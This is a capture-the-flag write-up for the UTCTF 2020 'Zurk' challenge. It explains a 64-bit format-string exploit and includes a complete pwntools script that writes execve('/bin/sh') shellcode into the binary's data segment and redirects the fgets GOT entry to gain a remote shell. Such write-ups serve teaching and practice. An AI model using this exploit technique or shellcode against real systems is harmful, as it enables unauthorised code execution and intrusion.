---
layout: post
title: UTCTF 2020 | Zurk Writeup
author: adamt
---

My writeup of the Zurk binary challenge.

# Challenge Desc

Zurk was a binary exploitation challenge in UTCTF 2020 which was a 64 bit format string where the attacker controlled a buffer of isze 50 with a call to fgets() passed directly to printf().

The binary had NX disabled and no PIE. However ASLR was enabled.

```c
checksec ./zurk

Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX disabled
PIE:      No PIE (0x400000)
RWX:      Has RWX segments
```

I wanted a challenge! So I wanted to give myself a handicap.

The handicap I gave myself was that I didn't want any NULL bytes in my payload. I solved this by leveraging the newline deletion to put NULL bytes in the write place in my buffer.

# Thoughts

There are 2 main thoughts to solve this challenge.

1. Overwrite a GOT address to point to system in libc
   a. This is going to be a problem, as our buffer is really small, if we were to write 2 bytes at a time, we would need 4*8=32 characters just for our addresses alone, meaning just 18 characters to do 4 writes with a format string.
2. Overwrite a GOT address to point to our own shellcode in the data region of the binary
   a. This is nicer because we can write out the shellcode over mutliple seperate writes
   b. Since PIE is disabled, the data region starts at 0x600100, this means we only need to write a 4byte address to the GOT, which is half the size of our previous option. We can probably fit this into our buffer as well.

## How do we get addresses into our buffer

So we can't just write addresses into our buffer, because of this whole NULL byte thingo. But reading through the dissassembly of the program, there is this interesting codepath.

```c
mov rdi, buffer
mov rsi, '\n'
call strcspn
mov [ret], 0x0
```

This is replacing the new line in our string with a null byte. We can use this to NULL out the entire buffer by.

1. Write a string of length buffer_size, the last value in our buffer gets set to NULL
2. Write a string of length buffer_size - 1, the second last value is set to NULL
3. continue

Sample code:
```python
 for i in range(0x30, 1, -1):
     send("A" * i)
```

After we do this, we can write our address (since it only has leading NULL bytes).

# Solution

```python
#!/usr/bin/python3
from pwn import *

PROGNAME   = "./zurk"
REMOTEIP   = "binary.utctf.live"
REMOTEPORT = 9003

# execve(/bin/sh)
SHELLCODE = ["\x31\xF6\x56\x48", "\xBB\x2F\x62\x69",
        "\x6E\x2F\x2F\x73", "\x68\x53\x54\x5F",
        "\xF7\xEE\xB0\x3B", "\x0F\x05\x00\x00"]


libc = ELF("./libc-2.23.so")
p = remote(REMOTEIP, REMOTEPORT)
elf = ELF(PROGNAME)

def talk(msg):
    p.sendlineafter("What would you like to do?\n", msg)

    until = " is not a valid instruction.\n"
    return p.recvuntil(until)[:-len(until)]

def leak_addr(addr):
    payload = b"%7$s".ljust(8, b' ')
    leak = talk(payload + p64(addr))

    # Get ride of spaces :P
    leak = leak.replace(b' ', b'\x00')[:8]
    leak = leak.rjust(8, b'\x00')

    return u64(leak)

# In order to write null bytes, we take advantage
# of the program replacing newlines with NULLs
def clear_stack():
    for i in range(0x30, 1, -1):
        print(".", end='')
        talk("A" * i)
    print("")

def do_write_4_bytes(addr, value):
    log.info(f"Writing {hex(value)} -> {hex(addr)}")
    clear_stack()

    value_h = value & 0xFFFFFFFF
    value_h1 = value_h >> 16
    value_h2 = value_h & 0xFFFF

    talk(p64(addr).rjust(48, b' '))
    talk(p64(addr + 2).rjust(32, b' ')) + b'a'

    payload = f"%{value_h1}c%9$hn"
    talk(payload)
    payload = f"%{value_h2}c%11$hn"
    talk(payload)

def do_write_8_bytes(addr, value):
    log.info(f"Writing {hex(value)} -> {hex(addr)}")
    clear_stack()


    talk(p64(addr).rjust(48, b' '))
    talk(p64(addr + 4).rjust(32, b' ')) + b'a'

    payload = f"%9$n%{value}c%11$n"
    talk(payload)



# put our shellcode at 0x601500
ADDR = 0x60110B  # Dont start at 00, we dont want 0x0a in our addr
do_write_4_bytes(ADDR + 4, u32(SHELLCODE[1]))
do_write_4_bytes(ADDR + 8, u32(SHELLCODE[2]))
do_write_4_bytes(ADDR + 12, u32(SHELLCODE[3]))
do_write_4_bytes(ADDR + 16, u32(SHELLCODE[4]))
do_write_4_bytes(ADDR + 20, u32(SHELLCODE[5]))
do_write_4_bytes(ADDR, u32(SHELLCODE[0]))

do_write_8_bytes(elf.got["fgets"], ADDR)

p.interactive()

```
